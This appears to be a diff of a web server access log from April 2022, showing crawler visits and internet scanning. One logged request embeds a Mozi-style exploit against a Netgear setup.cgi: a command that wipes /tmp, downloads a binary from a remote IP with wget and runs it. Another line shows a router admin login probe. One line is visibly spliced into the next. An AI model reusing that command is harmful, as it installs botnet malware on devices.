@@ -38,4 +38,9 @@
 128.14.134.170 - - [23/Apr/2022:11:42:37 +0000] "GET / HTTP/1.1" 200 15370 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
 51.222.253.1 - - [23/Apr/2022:11:48:03 +0000] "GET /robots.txt HTTP/1.1" 404 432 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
 103.66.208.187 - - [23/Apr/2022:12:02:40 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.66.208.187:59518/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 451 "-" "-"
-194.110.115.18 - - [23/Apr/2022:12:49:43 +0000] "GET / HTTP/1.1" 200 15426 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like
+194.110.115.18 - - [23/Apr/2022:12:49:43 +0000] "GET / HTTP/1.1" 200 15426 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like193.124.7.9 - - [23/Apr/2022:20:50:41 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 493 "http://158.247.223.84:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
+72.104.95.63 - - [23/Apr/2022:21:51:17 +0000] "GET / HTTP/1.1" 200 49968 "-" "-"
+157.55.39.177 - - [23/Apr/2022:21:56:05 +0000] "GET / HTTP/1.1" 200 15426 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
+45.83.65.47 - - [23/Apr/2022:22:47:06 +0000] "GET / HTTP/1.1" 200 15426 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
+45.83.67.59 - - [23/Apr/2022:22:47:06 +0000] "GET /favicon.svg HTTP/1.1" 404 493 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
+114.119.133.78 - - [23/Apr/2022:23:02:13 +0000] "GET /robots.txt HTTP/1.1" 404 488 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
